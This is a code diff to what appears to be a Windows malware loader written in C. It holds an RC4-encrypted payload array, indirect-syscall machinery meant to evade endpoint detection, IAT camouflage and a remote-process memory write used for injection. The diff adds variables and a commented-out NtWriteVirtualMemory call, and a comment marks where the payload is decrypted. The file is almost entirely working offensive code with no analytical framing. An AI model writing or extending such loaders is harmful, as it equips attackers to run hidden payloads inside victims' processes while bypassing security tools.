@@ -306,8 +306,11 @@ unsigned char Rc4EncData[2048] = {
 		0x52, 0x98, 0xE8, 0x4F, 0x97, 0x33, 0x8F, 0xDC, 0xDC, 0x32, 0x57, 0x68, 0x24, 0x03, 0x4C, 0x25
 };
 
+
+
 //---------------------------------------------------------------------------------------------------------------------------------
 //---------------------------------------------------------------------------------------------------------------------------------
+
 
 int main(int argc, char* argv[]) {
 
@@ -322,6 +325,12 @@ int main(int argc, char* argv[]) {
 	SIZE_T					sNumberOfBytesWritten		= NULL;
 	SIZE_T				pRc4Encrypt = sizeof(Rc4EncData);
 
+	SIZE_T				sizeOfBuffer = 1024;
+
+	PVOID				pRc4EncData = &Rc4EncData;
+
+	DWORD				dwFileLength = 0x00;
+
 
 	AddWin32uToIat();
 
@@ -329,7 +338,6 @@ int main(int argc, char* argv[]) {
 	if (!InitIndirectSyscalls(&g_Nt)) {
 		return -1;
 	}
-
 
 	if (argc == 1) {
 
@@ -443,6 +451,13 @@ int main(int argc, char* argv[]) {
 			printf("[!] Failed To Decrypt Payload: %d\n", __LINE__);
 			return -1;
 		}
+
+		//printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
+		/*SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
+		if ((STATUS = RunSyscall(hTargetProcess, uBaseAddress, pRc4EncData, 1024, &sNumberOfBytesWritten)) != 0x00) {
+			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+			return FALSE;
+		}*/
 
 		// Rc4EncData is now plaintext payload
 
